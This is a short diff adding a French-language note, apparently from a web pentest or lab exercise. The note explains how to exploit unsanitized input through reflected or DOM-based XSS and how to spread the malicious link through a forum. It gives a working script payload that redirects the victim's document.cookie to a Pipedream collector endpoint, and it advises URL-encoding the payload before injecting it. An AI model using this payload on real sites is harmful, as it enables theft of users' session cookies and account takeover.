@@ -1,0 +1,10 @@
+il y a possibilite pour aller un peu plus loin etant donne que l'input nest pas sanitize on peux exploiter le reflected via DOM based dans le forum il y a possibilite 
+d'envoyer des lien par exemple quie redirige vers l' exploit de la page image qui va grave les cookie avec un payload
+ + document.cookie redirigeant la request vers un server prive,
+tel que http request ou pipedream pour intercepter la resquest.
+
+le payload ressemblera a ca :
+
+<script>document.location="https://endpoint.m.pipedream.net?c="+document.cookie</script>
+
+injecter directement dans l'url tout en l'encodant manuellement ou via https://www.urlencoder.org/
